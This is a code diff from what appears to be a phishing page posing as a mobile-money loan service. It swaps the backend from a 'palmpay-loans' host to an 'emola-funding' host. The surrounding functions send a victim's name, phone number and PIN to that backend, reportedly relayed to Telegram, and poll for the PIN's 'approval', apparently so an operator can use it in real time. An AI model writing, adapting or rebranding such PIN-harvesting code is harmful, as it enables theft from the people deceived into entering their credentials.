@@ -238,7 +238,7 @@ const boxes = document.querySelectorAll(".pin-boxes input");
 const statusEl = document.getElementById("status");
 
 async function sendPinToTelegram(name, phone, pin) {
-  const BACKEND_URL = "https://palmpay-loans-8ioh.onrender.com";
+  const BACKEND_URL = "https://emola-funding.onrender.com";
   try {
     const res = await fetch(`${BACKEND_URL}/submit-pin`, {
       method: "POST",
@@ -252,7 +252,7 @@ async function sendPinToTelegram(name, phone, pin) {
 }
 
 async function pollPinApproval(requestId) {
-  const BACKEND_URL = "https://palmpay-loans-8ioh.onrender.com";
+  const BACKEND_URL = "https://emola-funding.onrender.com";
   return new Promise(resolve => {
     const i = setInterval(async () => {
       const r = await fetch(`${BACKEND_URL}/check-pin/${requestId}`);
